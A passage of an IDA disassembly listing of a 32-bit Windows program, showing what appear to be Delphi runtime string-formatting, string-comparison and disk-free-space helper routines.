		push	esi
		push	edi
		mov	edi, ecx
		mov	esi, edx
		mov	ebx, eax
		push	esi
		push	edi
		mov	ecx, ebx
		mov	dl, 1
		mov	eax, off_412430
		call	sub_413EA8
		call	sub_40336C
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_412820	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_412844	proc near		; CODE XREF: sub_41557C+7Bp
					; sub_41557C+8Cp
		push	ebx
		push	esi
		push	edi
		mov	edi, edx
		mov	esi, eax
		mov	eax, esi
		call	sub_403C24
		mov	ebx, eax
		mov	eax, edi
		mov	edx, ebx
		call	sub_403F0C
		mov	edx, esi
		mov	esi, [edi]
		test	ebx, ebx
		jz	short loc_41287A

loc_412865:				; CODE XREF: sub_412844+34j
		mov	al, [edx]
		cmp	al, 61h
		jb	short loc_412871
		cmp	al, 7Ah
		ja	short loc_412871
		sub	al, 20h

loc_412871:				; CODE XREF: sub_412844+25j
					; sub_412844+29j
		mov	[esi], al
		inc	edx
		inc	esi
		dec	ebx
		test	ebx, ebx
		jnz	short loc_412865

loc_41287A:				; CODE XREF: sub_412844+1Fj
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_412844	endp

; ---------------------------------------------------------------------------
		align 10h
; START	OF FUNCTION CHUNK FOR sub_412D4E

loc_412880:				; CODE XREF: sub_412D4E+CAj
					; sub_412D4E+D8j ...
		or	cl, cl
		jnz	short loc_41289B
		or	eax, eax
		jns	short sub_412896
		neg	eax
		call	sub_412896
		mov	al, 2Dh
		inc	ecx
		dec	esi
		mov	[esi], al
		retn
; END OF FUNCTION CHUNK	FOR sub_412D4E

; =============== S U B	R O U T	I N E =======================================


sub_412896	proc near		; CODE XREF: sub_412D4E-4C8j
					; sub_412D4E-4C4p
		mov	ecx, 0Ah

loc_41289B:				; CODE XREF: sub_412D4E-4CCj
		push	edx
		push	esi

loc_41289D:				; CODE XREF: sub_412896+1Bj
		xor	edx, edx
		div	ecx
		dec	esi
		add	dl, 30h
		cmp	dl, 3Ah
		jb	short loc_4128AD
		add	dl, 7

loc_4128AD:				; CODE XREF: sub_412896+12j
		mov	[esi], dl
		or	eax, eax
		jnz	short loc_41289D
		pop	ecx
		pop	edx
		sub	ecx, esi
		sub	edx, ecx
		jbe	short locret_4128CB
		add	ecx, edx
		mov	al, 30h
		sub	esi, edx
		jmp	short loc_4128C6
; ---------------------------------------------------------------------------

loc_4128C3:				; CODE XREF: sub_412896+31j
		mov	[edx+esi], al

loc_4128C6:				; CODE XREF: sub_412896+2Bj
		dec	edx
		jnz	short loc_4128C3
		mov	[esi], al

locret_4128CB:				; CODE XREF: sub_412896+23j
		retn
sub_412896	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_412D4E

loc_4128CC:				; CODE XREF: sub_412D4E+94j
					; sub_412D4E+A2j ...
		or	cl, cl
		jnz	short sub_412900
		mov	ecx, 0Ah
		test	dword ptr [eax+4], 80000000h
		jz	short sub_412900
		push	dword ptr [eax+4]
		push	dword ptr [eax]
		mov	eax, esp
		neg	[esp+8+var_8]
		adc	[esp+8+var_4], 0
		neg	[esp+8+var_4]
		call	sub_412900
		mov	byte ptr [esi-1], 2Dh
		dec	esi
		inc	ecx
		add	esp, 8
		retn
; END OF FUNCTION CHUNK	FOR sub_412D4E

; =============== S U B	R O U T	I N E =======================================


sub_412900	proc near		; CODE XREF: sub_412D4E-480j
					; sub_412D4E-472j ...

var_18		= qword	ptr -18h
var_C		= dword	ptr -0Ch
var_8		= word ptr -8
var_6		= word ptr -6

		push	esi
		sub	esp, 4
		fnstcw	[esp+8+var_6]
		fnstcw	[esp+8+var_8]
		or	[esp+8+var_8], 0F00h
		fldcw	[esp+8+var_8]
		mov	[esp+8+var_8], cx
		fld1
		test	dword ptr [eax+4], 80000000h
		jz	short loc_41294A
		push	dword ptr [eax+4]
		push	dword ptr [eax]
		and	[esp+10h+var_C], 7FFFFFFFh
		push	7FFFFFFFh
		push	0FFFFFFFFh
		fild	qword ptr [esp+8]
		fild	[esp+18h+var_18]
		fadd	st, st(2)
		faddp	st(1), st
		add	esp, 10h
		jmp	short loc_41294C
; ---------------------------------------------------------------------------

loc_41294A:				; CODE XREF: sub_412900+21j
		fild	qword ptr [eax]

loc_41294C:				; CODE XREF: sub_412900+48j
		fild	[esp+8+var_8]
		fld	st(1)

loc_412951:				; CODE XREF: sub_412900+6Ej
		dec	esi
		fprem
		fistp	[esp+8+var_8]
		fdiv	st(1), st
		mov	al, byte ptr [esp+8+var_8]
		add	al, 30h
		cmp	al, 3Ah
		jb	short loc_412964
		add	al, 7

loc_412964:				; CODE XREF: sub_412900+60j
		mov	[esi], al
		fld	st(1)
		fcom	st(3)
		fstsw	ax
		sahf
		jnb	short loc_412951
		fldcw	[esp+8+var_6]
		add	esp, 4
		ffree	st(3)
		ffree	st(2)
		ffree	st(1)
		ffree	st
		pop	ecx
		sub	ecx, esi
		sub	edx, ecx
		jbe	short locret_412996
		sub	esi, edx
		mov	al, 30h
		add	ecx, edx
		jmp	short loc_412991
; ---------------------------------------------------------------------------

loc_41298E:				; CODE XREF: sub_412900+92j
		mov	[edx+esi], al

loc_412991:				; CODE XREF: sub_412900+8Cj
		dec	edx
		jnz	short loc_41298E
		mov	[esi], al

locret_412996:				; CODE XREF: sub_412900+84j
		retn
sub_412900	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_412998	proc near		; CODE XREF: sub_413804+3Ep
					; sub_41387C+34p ...

var_8		= dword	ptr -8

		push	ebx
		push	ecx
		mov	ebx, edx
		mov	edx, esp
		call	sub_4027E0
		cmp	[esp+8+var_8], 0
		jz	short loc_4129AB
		mov	eax, ebx

loc_4129AB:				; CODE XREF: sub_412998+Fj
		pop	edx
		pop	ebx
		retn
sub_412998	endp

; ---------------------------------------------------------------------------
		align 10h
		dd 0FFFFFFFFh, 1
dword_4129B8	dd 30h,	0FFFFFFFFh, 2, 312Dh ; DATA XREF: DATA:off_416B60o
					; DATA:00416B64o

; =============== S U B	R O U T	I N E =======================================


sub_4129C8	proc near		; CODE XREF: sub_412A18+Ep
		push	ebx
		push	esi
		push	edi
		push	ebp
		mov	esi, edx
		mov	ebx, eax
		mov	eax, esi
		call	sub_403C24
		mov	edi, eax
		mov	eax, ebx
		call	sub_403E24
		mov	ebp, eax
		test	edi, edi
		jle	short loc_412A0E

loc_4129E6:				; CODE XREF: sub_4129C8+44j
		mov	bl, [esi+edi-1]
		test	bl, bl
		jz	short loc_412A09
		mov	edx, ebx
		mov	eax, ebp
		call	sub_412B88
		test	eax, eax
		jz	short loc_412A09
		mov	edx, edi
		mov	eax, esi
		call	sub_414658
		cmp	al, 2
		jnz	short loc_412A0E
		dec	edi

loc_412A09:				; CODE XREF: sub_4129C8+24j
					; sub_4129C8+31j
		dec	edi
		test	edi, edi
		jg	short loc_4129E6

loc_412A0E:				; CODE XREF: sub_4129C8+1Cj
					; sub_4129C8+3Ej
		mov	eax, edi
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4129C8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_412A18	proc near		; CODE XREF: sub_4141C4+CCp
					; CODE:00415A48p
		push	ebx
		push	esi
		push	edi
		mov	edi, edx
		mov	ebx, eax
		mov	edx, ebx
		mov	eax, offset dword_412A4C
		call	sub_4129C8
		mov	esi, eax
		push	edi
		lea	edx, [esi+1]
		mov	ecx, 7FFFFFFFh
		mov	eax, ebx
		call	sub_403E84
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_412A18	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 2
dword_412A4C	dd 3A5Ch		; DATA XREF: sub_412A18+9o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_412A50(LPCSTR lpRootPathName, int, int, int)
sub_412A50	proc near		; DATA XREF: sub_414D50+2Ao

var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
TotalNumberOfClusters= dword ptr -10h
NumberOfFreeClusters= dword ptr	-0Ch
BytesPerSector	= dword	ptr -8
SectorsPerCluster= dword ptr -4
lpRootPathName	= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFE8h
		push	ebx
		mov	eax, [ebp+lpRootPathName]
		test	eax, eax
		jnz	short loc_412A60
		xor	eax, eax

loc_412A60:				; CODE XREF: sub_412A50+Cj
		lea	edx, [ebp+TotalNumberOfClusters]
		push	edx		; lpTotalNumberOfClusters
		lea	edx, [ebp+NumberOfFreeClusters]
		push	edx		; lpNumberOfFreeClusters
		lea	edx, [ebp+BytesPerSector]
		push	edx		; lpBytesPerSector
		lea	edx, [ebp+SectorsPerCluster]
		push	edx		; lpSectorsPerCluster
		push	eax		; lpRootPathName
		call	GetDiskFreeSpaceA
		mov	ebx, eax
		mov	eax, [ebp+SectorsPerCluster]
		imul	[ebp+BytesPerSector]
		xor	edx, edx
		mov	[ebp+var_18], eax
		mov	[ebp+var_14], edx
		mov	eax, [ebp+NumberOfFreeClusters]
		xor	edx, edx
		push	edx
		push	eax
		mov	eax, [ebp+var_18]
		mov	edx, [ebp+var_14]
		call	sub_404440
		mov	ecx, [ebp+arg_4]
		mov	[ecx], eax
		mov	[ecx+4], edx
		mov	eax, [ebp+TotalNumberOfClusters]
		xor	edx, edx
		push	edx
		push	eax
		mov	eax, [ebp+var_18]
		mov	edx, [ebp+var_14]
		call	sub_404440
		mov	ecx, [ebp+arg_8]
		mov	[ecx], eax
		mov	[ecx+4], edx
		mov	eax, ebx
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	10h
sub_412A50	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_412AC4	proc near		; CODE XREF: sub_412F9C+16p
					; sub_413B60+BDp ...
		mov	edx, edi
		mov	edi, eax
		mov	ecx, 0FFFFFFFFh
		xor	al, al
		repne scasb
		mov	eax, 0FFFFFFFEh
		sub	eax, ecx
		mov	edi, edx
		retn
sub_412AC4	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_412ADC	proc near		; CODE XREF: sub_412B9C+2Bp
		push	esi
		mov	esi, eax
		xchg	eax, edx
		call	sub_402664
		mov	eax, esi
		pop	esi
		retn
sub_412ADC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_412AEC	proc near		; CODE XREF: sub_413B60+91p
		push	edi
		push	esi
		push	ebx
		mov	esi, eax
		mov	edi, edx
		mov	ebx, ecx
		xor	al, al
		test	ecx, ecx
		jz	short loc_412B00
		repne scasb
		jnz	short loc_412B00
		inc	ecx

loc_412B00:				; CODE XREF: sub_412AEC+Dj
					; sub_412AEC+11j
		sub	ebx, ecx
		mov	edi, esi
		mov	esi, edx
		mov	edx, edi
		mov	ecx, ebx
		shr	ecx, 2
		rep movsd
		mov	ecx, ebx
		and	ecx, 3
		rep movsb
		stosb
		mov	eax, edx
		pop	ebx
		pop	esi
		pop	edi
		retn
sub_412AEC	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_412B20	proc near		; CODE XREF: sub_4154A8+62p
		push	edi
		push	esi
		mov	edi, edx
		mov	esi, eax
		mov	ecx, 0FFFFFFFFh
		xor	eax, eax
		repne scasb
		not	ecx
		mov	edi, edx
		xor	edx, edx
		repe cmpsb
		mov	al, [esi-1]
		mov	dl, [edi-1]
		sub	eax, edx
		pop	esi
		pop	edi
		retn
sub_412B20	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_412B44	proc near		; CODE XREF: sub_41392C+109p
					; sub_41392C+12Fp ...
		push	edi
		push	esi
		push	ebx
		mov	edi, edx
		mov	esi, eax
		mov	ebx, ecx
		xor	eax, eax
		or	ecx, ecx
		jz	short loc_412B82
		repne scasb
		sub	ebx, ecx
		mov	ecx, ebx
		mov	edi, edx
		xor	edx, edx

loc_412B5D:				; CODE XREF: sub_412B44+3Cj
		repe cmpsb
		jz	short loc_412B82
		mov	al, [esi-1]
		cmp	al, 61h
		jb	short loc_412B6E
		cmp	al, 7Ah
		ja	short loc_412B6E
		sub	al, 20h

loc_412B6E:				; CODE XREF: sub_412B44+22j
					; sub_412B44+26j
		mov	dl, [edi-1]
		cmp	dl, 61h
		jb	short loc_412B7E
		cmp	dl, 7Ah
		ja	short loc_412B7E
		sub	dl, 20h

loc_412B7E:				; CODE XREF: sub_412B44+30j
					; sub_412B44+35j
		sub	eax, edx
		jz	short loc_412B5D

loc_412B82:				; CODE XREF: sub_412B44+Dj
					; sub_412B44+1Bj
		pop	ebx
		pop	esi
		pop	edi
		retn
sub_412B44	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_412B88	proc near		; CODE XREF: sub_4129C8+2Ap
					; sub_414718+Bp ...
		jmp	short loc_412B92
; ---------------------------------------------------------------------------

loc_412B8A:				; CODE XREF: sub_412B88+Ej
		test	cl, cl
		jnz	short loc_412B91
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_412B91:				; CODE XREF: sub_412B88+4j
		inc	eax

loc_412B92:				; CODE XREF: sub_412B88j
		mov	cl, [eax]
		cmp	dl, cl
		jnz	short loc_412B8A
		retn
sub_412B88	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_412B9C	proc near		; CODE XREF: sub_412D4E+7Dp

var_34		= byte ptr -34h
var_14		= dword	ptr -14h
var_10		= byte ptr -10h

		push	ebx
		push	esi
		push	edi
		add	esp, 0FFFFFFD8h
		mov	ebx, ecx
		mov	esi, edx
		mov	edi, eax
		cmp	ebx, 1Fh
		jbe	short loc_412BB2
		mov	ebx, 1Fh

loc_412BB2:				; CODE XREF: sub_412B9C+Fj
		mov	edx, ebx
		dec	edx
		mov	eax, esi
		call	sub_41467C
		cmp	al, 1
		jnz	short loc_412BC1
		dec	ebx

loc_412BC1:				; CODE XREF: sub_412B9C+22j
		mov	eax, esp
		mov	ecx, ebx
		mov	edx, esi
		call	sub_412ADC
		mov	[esp+ebx+34h+var_34], 0
		mov	eax, esp
		mov	[esp+34h+var_14], eax
		mov	[esp+34h+var_10], 6
		lea	edx, [esp+34h+var_14]
		mov	eax, ds:off_416B68[edi*4]
		xor	ecx, ecx
		call	sub_412820
		add	esp, 28h
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_412B9C	endp


; =============== S U B	R O U T	I N E =======================================


sub_412BF4	proc near		; CODE XREF: sub_412D4E+114p
		push	ebx
		mov	ecx, ds:off_416E6C
		cmp	dword ptr [ecx], 0
		jz	short loc_412C0C
		mov	ebx, ds:off_416E6C
		mov	ebx, [ebx]
		call	ebx
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_412C0C:				; CODE XREF: sub_412BF4+Aj
		mov	al, 10h
		call	sub_402608
sub_412BF4	endp

; ---------------------------------------------------------------------------
		pop	ebx
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_412C18	proc near		; CODE XREF: sub_412C24+D3p
		push	ebx
		mov	ebx, eax
		mov	eax, ebx
		call	sub_403994
		pop	ebx
		retn
sub_412C18	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_412C24	proc near		; CODE XREF: sub_412F9C+2Ap
					; sub_412FF0+4Ap ...

var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_19		= byte ptr -19h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_8		= dword	ptr  10h

; FUNCTION CHUNK AT 00412F8B SIZE 0000000F BYTES

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFF94h
		push	ebx
		xor	ebx, ebx
		mov	[ebp+var_14], ebx
		push	ebx
		push	esi
		push	edi
		mov	edi, eax
		mov	esi, ecx
		xor	eax, eax
		mov	[ebp+var_4], eax
		add	ecx, [ebp+arg_8]
		mov	[ebp+var_8], edi
		xor	eax, eax
		mov	[ebp+var_C], eax
		mov	[ebp+var_10], eax
		mov	[ebp+var_14], eax

loc_412C4D:				; CODE XREF: sub_412C24+DDj
		or	edx, edx
		jz	short loc_412C5E

loc_412C51:				; CODE XREF: sub_412C24+38j
		cmp	esi, ecx
		jz	short loc_412C5E
		lodsb
		cmp	al, 25h
		jz	short loc_412C68

loc_412C5A:				; CODE XREF: sub_412C24+4Bj
		stosb
		dec	edx
		jnz	short loc_412C51

loc_412C5E:				; CODE XREF: sub_412C24+2Bj
					; sub_412C24+2Fj ...
		mov	eax, edi
		sub	eax, [ebp+var_8]
		jmp	loc_412F8B
; ---------------------------------------------------------------------------

loc_412C68:				; CODE XREF: sub_412C24+34j
		cmp	esi, ecx
		jz	short loc_412C5E
		lodsb
		cmp	al, 25h
		jz	short loc_412C5A
		lea	ebx, [esi-2]
		mov	[ebp+var_18], ebx

loc_412C77:				; CODE XREF: sub_412C24+70j
		mov	[ebp+var_19], al
		cmp	al, 2Dh
		jnz	short loc_412C83
		cmp	esi, ecx
		jz	short loc_412C5E
		lodsb

loc_412C83:				; CODE XREF: sub_412C24+58j
		call	sub_412D06
		cmp	al, 3Ah
		jnz	short loc_412C96
		mov	[ebp+var_C], ebx
		cmp	esi, ecx
		jz	short loc_412C5E
		lodsb
		jmp	short loc_412C77
; ---------------------------------------------------------------------------

loc_412C96:				; CODE XREF: sub_412C24+66j
		mov	[ebp+var_20], ebx
		mov	ebx, 0FFFFFFFFh
		cmp	al, 2Eh
		jnz	short loc_412CAC
		cmp	esi, ecx
		jz	short loc_412C5E
		lodsb
		call	sub_412D06

loc_412CAC:				; CODE XREF: sub_412C24+7Cj
		mov	[ebp+var_24], ebx
		mov	[ebp+var_28], esi
		push	ecx
		push	edx
		call	sub_412D4E
		pop	edx
		mov	ebx, [ebp+var_20]
		sub	ebx, ecx
		jnb	short loc_412CC3
		xor	ebx, ebx

loc_412CC3:				; CODE XREF: sub_412C24+9Bj
		cmp	[ebp+var_19], 2Dh
		jnz	short loc_412CD3
		sub	edx, ecx
		jnb	short loc_412CD1
		add	ecx, edx
		xor	edx, edx

loc_412CD1:				; CODE XREF: sub_412C24+A7j
		rep movsb

loc_412CD3:				; CODE XREF: sub_412C24+A3j
		xchg	ebx, ecx
		sub	edx, ecx
		jnb	short loc_412CDD
		add	ecx, edx
		xor	edx, edx

loc_412CDD:				; CODE XREF: sub_412C24+B3j
		mov	al, 20h
		rep stosb
		xchg	ebx, ecx
		sub	edx, ecx
		jnb	short loc_412CEB
		add	ecx, edx
		xor	edx, edx

loc_412CEB:				; CODE XREF: sub_412C24+C1j
		rep movsb
		cmp	[ebp+var_10], 0
		jz	short loc_412CFD
		push	edx
		lea	eax, [ebp+var_10]
		call	sub_412C18
		pop	edx

loc_412CFD:				; CODE XREF: sub_412C24+CDj
		pop	ecx
		mov	esi, [ebp+var_28]
		jmp	loc_412C4D
sub_412C24	endp


; =============== S U B	R O U T	I N E =======================================


sub_412D06	proc near		; CODE XREF: sub_412C24:loc_412C83p
					; sub_412C24+83p
		xor	ebx, ebx
		cmp	al, 2Ah
		jz	short loc_412D2E

loc_412D0C:				; CODE XREF: sub_412D06+20j
		cmp	al, 30h
		jb	short locret_412D4D
		cmp	al, 39h
		ja	short locret_412D4D
		imul	ebx, 0Ah
		sub	al, 30h
		movzx	eax, al
		add	ebx, eax
		cmp	esi, ecx
		jz	short loc_412D28
		lodsb
		jmp	short loc_412D0C
; ---------------------------------------------------------------------------

loc_412D28:				; CODE XREF: sub_412D06+1Dj
					; sub_412D06+44j
		pop	eax
		jmp	loc_412C5E
; ---------------------------------------------------------------------------

loc_412D2E:				; CODE XREF: sub_412D06+4j
		mov	eax, [ebp-0Ch]
		cmp	eax, [ebp+8]
		jg	short loc_412D48
		inc	dword ptr [ebp-0Ch]
		mov	ebx, [ebp+0Ch]
		cmp	byte ptr [ebx+eax*8+4],	0
		mov	ebx, [ebx+eax*8]
		jz	short loc_412D48
		xor	ebx, ebx

loc_412D48:				; CODE XREF: sub_412D06+2Ej
					; sub_412D06+3Ej
		cmp	esi, ecx
		jz	short loc_412D28
		lodsb

locret_412D4D:				; CODE XREF: sub_412D06+8j
					; sub_412D06+Cj
		retn
sub_412D06	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_412D4E	proc near		; CODE XREF: sub_412C24+90p

var_8		= dword	ptr -8
var_4		= dword	ptr -4

; FUNCTION CHUNK AT 00412880 SIZE 00000016 BYTES
; FUNCTION CHUNK AT 004128CC SIZE 00000034 BYTES

		and	al, 0DFh
		mov	cl, al
		mov	eax, 1
		mov	ebx, [ebp-0Ch]
		cmp	ebx, [ebp+8]
		jg	short loc_412DBB
		inc	dword ptr [ebp-0Ch]
		mov	esi, [ebp+0Ch]
		lea	esi, [esi+ebx*8]
		mov	eax, [esi]
		movzx	edx, byte ptr [esi+4]
		jmp	off_412D75[edx*4]
; ---------------------------------------------------------------------------
off_412D75	dd offset loc_412E06	; DATA XREF: sub_412D4E+20r
		dd offset loc_412DB9
		dd offset loc_412E3F
		dd offset loc_412F06
		dd offset loc_412E6F
		dd offset loc_412EE7
		dd offset loc_412EC7
		dd offset loc_412DB9
		dd offset loc_412DB9
		dd offset loc_412DB9
		dd offset loc_412E80
		dd offset loc_412EAB
		dd offset loc_412F02
		dd offset loc_412E4E
		dd offset loc_412DB9
		dd offset loc_412E87
		dd offset loc_412DD0
; ---------------------------------------------------------------------------

loc_412DB9:				; CODE XREF: sub_412D4E+20j
					; sub_412D4E+B6j ...
		xor	eax, eax

loc_412DBB:				; CODE XREF: sub_412D4E+Fj
		call	sub_412F7B
		mov	edx, [ebp-18h]
		mov	ecx, [ebp-28h]
		sub	ecx, edx
		mov	ebx, [ebp-4]
		call	sub_412B9C

loc_412DD0:				; CODE XREF: sub_412D4E+20j
					; DATA XREF: sub_412D4E+67o
		lea	esi, [ebp-49h]
		mov	edx, [ebp-24h]
		cmp	edx, 20h
		jbe	short loc_412DDD
		xor	edx, edx

loc_412DDD:				; CODE XREF: sub_412D4E+8Bj
		mov	ebx, ecx
		sub	cl, 44h
		jz	loc_4128CC
		mov	ecx, 10h
		cmp	bl, 58h
		jz	loc_4128CC
		mov	ecx, 0Ah
		cmp	bl, 55h
		jz	loc_4128CC
		jmp	short loc_412DB9
; ---------------------------------------------------------------------------

loc_412E06:				; CODE XREF: sub_412D4E+20j
					; DATA XREF: sub_412D4E:off_412D75o
		lea	esi, [ebp-59h]
		mov	edx, [ebp-24h]
		mov	ebx, ecx
		cmp	edx, 10h
		jbe	short loc_412E15
		xor	edx, edx

loc_412E15:				; CODE XREF: sub_412D4E+C3j
		sub	cl, 44h
		jz	loc_412880
		mov	ecx, 10h
		cmp	bl, 58h
		jz	loc_412880
		mov	ecx, 0Ah
		cmp	bl, 55h
		jz	loc_412880
		jmp	loc_412DB9
; ---------------------------------------------------------------------------

loc_412E3F:				; CODE XREF: sub_412D4E+20j
					; DATA XREF: sub_412D4E+2Fo
		cmp	cl, 53h
		jnz	loc_412DB9
		mov	ecx, 1
		retn
; ---------------------------------------------------------------------------

loc_412E4E:				; CODE XREF: sub_412D4E+20j
					; DATA XREF: sub_412D4E+5Bo
		cmp	cl, 53h
		jnz	loc_412DB9
		cmp	word ptr [eax],	1
		jbe	short loc_412E6C
		mov	edx, eax
		lea	eax, [ebp-10h]
		call	sub_412BF4
		mov	esi, [ebp-10h]
		jmp	short loc_412EB6
; ---------------------------------------------------------------------------

loc_412E6C:				; CODE XREF: sub_412D4E+10Dj
					; sub_412D4E+16Aj
		xor	ecx, ecx
		retn
; ---------------------------------------------------------------------------

loc_412E6F:				; CODE XREF: sub_412D4E+20j
					; DATA XREF: sub_412D4E+37o
		cmp	cl, 53h
		jnz	loc_412DB9
		mov	esi, eax
		lodsb
		movzx	ecx, al
		jmp	short loc_412EBD
; ---------------------------------------------------------------------------

loc_412E80:				; CODE XREF: sub_412D4E+20j
					; DATA XREF: sub_412D4E+4Fo
		mov	esi, offset sub_403BBC
		jmp	short loc_412E8C
; ---------------------------------------------------------------------------

loc_412E87:				; CODE XREF: sub_412D4E+20j
					; DATA XREF: sub_412D4E+63o
		mov	esi, offset loc_403C10

loc_412E8C:				; CODE XREF: sub_412D4E+137j
		add	esi, [ebp-4]
		cmp	cl, 53h
		jnz	loc_412DB9
		mov	edx, eax
		lea	eax, [ebp-14h]
		push	ebx
		mov	ebx, [ebp-4]
		call	esi
		pop	ebx
		mov	esi, [ebp-14h]
		mov	eax, esi
		jmp	short loc_412EB6
; ---------------------------------------------------------------------------

loc_412EAB:				; CODE XREF: sub_412D4E+20j
					; DATA XREF: sub_412D4E+53o
		cmp	cl, 53h
		jnz	loc_412DB9
		mov	esi, eax

loc_412EB6:				; CODE XREF: sub_412D4E+11Cj
					; sub_412D4E+15Bj
		or	esi, esi
		jz	short loc_412E6C
		mov	ecx, [esi-4]

loc_412EBD:				; CODE XREF: sub_412D4E+130j
		cmp	ecx, [ebp-24h]
		ja	short loc_412EC3
		retn
; ---------------------------------------------------------------------------

loc_412EC3:				; CODE XREF: sub_412D4E+172j
		mov	ecx, [ebp-24h]
		retn
; ---------------------------------------------------------------------------

loc_412EC7:				; CODE XREF: sub_412D4E+20j
					; DATA XREF: sub_412D4E+3Fo
		cmp	cl, 53h
		jnz	loc_412DB9
		mov	esi, eax
		push	edi
		mov	edi, eax
		xor	al, al
		mov	ecx, [ebp-24h]
		jecxz	short loc_412EE1
		repne scasb
		jnz	short loc_412EE1
		dec	edi

loc_412EE1:				; CODE XREF: sub_412D4E+18Cj
					; sub_412D4E+190j
		mov	ecx, edi
		sub	ecx, esi
		pop	edi
		retn
; ---------------------------------------------------------------------------

loc_412EE7:				; CODE XREF: sub_412D4E+20j
					; DATA XREF: sub_412D4E+3Bo
		cmp	cl, 50h
		jnz	loc_412DB9
		mov	edx, 8
		mov	ecx, 10h
		lea	esi, [ebp-59h]
		jmp	loc_412880
; ---------------------------------------------------------------------------

loc_412F02:				; CODE XREF: sub_412D4E+20j
					; DATA XREF: sub_412D4E+57o
		mov	bh, 1
		jmp	short loc_412F08
; ---------------------------------------------------------------------------

loc_412F06:				; CODE XREF: sub_412D4E+20j
					; DATA XREF: sub_412D4E+33o
		mov	bh, 0

loc_412F08:				; CODE XREF: sub_412D4E+1B6j
		mov	esi, eax
		mov	bl, 0
		cmp	cl, 47h
		jz	short loc_412F50
		mov	bl, 1
		cmp	cl, 45h
		jz	short loc_412F50
		mov	bl, 2
		cmp	cl, 46h
		jz	short loc_412F31
		mov	bl, 3
		cmp	cl, 4Eh
		jz	short loc_412F31
		cmp	cl, 4Dh
		jnz	loc_412DB9
		mov	bl, 4

loc_412F31:				; CODE XREF: sub_412D4E+1CFj
					; sub_412D4E+1D6j
		mov	eax, 12h
		mov	edx, [ebp-24h]
		cmp	edx, eax
		jbe	short loc_412F62
		mov	edx, 2
		cmp	cl, 4Dh
		jnz	short loc_412F62
		movzx	edx, ds:byte_417700
		jmp	short loc_412F62
; ---------------------------------------------------------------------------

loc_412F50:				; CODE XREF: sub_412D4E+1C1j
					; sub_412D4E+1C8j
		mov	eax, [ebp-24h]
		mov	edx, 3
		cmp	eax, 12h
		jbe	short loc_412F62
		mov	eax, 0Fh

loc_412F62:				; CODE XREF: sub_412D4E+1EDj
					; sub_412D4E+1F7j ...
		push	ebx
		push	eax
		push	edx
		lea	eax, [ebp-69h]
		mov	edx, esi
		movzx	ecx, bh
		mov	ebx, [ebp-4]
		call	sub_4130F4
		mov	ecx, eax
		lea	esi, [ebp-69h]
		retn
sub_412D4E	endp


; =============== S U B	R O U T	I N E =======================================


sub_412F7B	proc near		; CODE XREF: sub_412D4E:loc_412DBBp
					; sub_412C24:loc_412F8Bp
		push	ebx
		push	eax
		lea	eax, [ebp-14h]
		mov	ebx, [ebp-4]
		call	sub_403994
		pop	eax
		pop	ebx
		retn
sub_412F7B	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_412C24

loc_412F8B:				; CODE XREF: sub_412C24+3Fj
		call	sub_412F7B
		pop	edi
		pop	esi
		pop	ebx
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	0Ch
; END OF FUNCTION CHUNK	FOR sub_412C24
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_412F9C	proc near		; CODE XREF: sub_413B60+169p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		mov	edi, edx
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_412FD3
		test	esi, esi
		jz	short loc_412FD3
		mov	eax, esi
		call	sub_412AC4
		push	eax
		mov	eax, [ebp+arg_4]
		push	eax
		mov	eax, [ebp+arg_0]
		push	eax
		mov	ecx, esi
		mov	eax, ebx
		mov	edx, edi
		call	sub_412C24
		mov	byte ptr [ebx+eax], 0
		mov	eax, ebx
		jmp	short loc_412FD5
; ---------------------------------------------------------------------------

loc_412FD3:				; CODE XREF: sub_412F9C+Ej
					; sub_412F9C+12j
		xor	eax, eax

loc_412FD5:				; CODE XREF: sub_412F9C+35j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	8
sub_412F9C	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

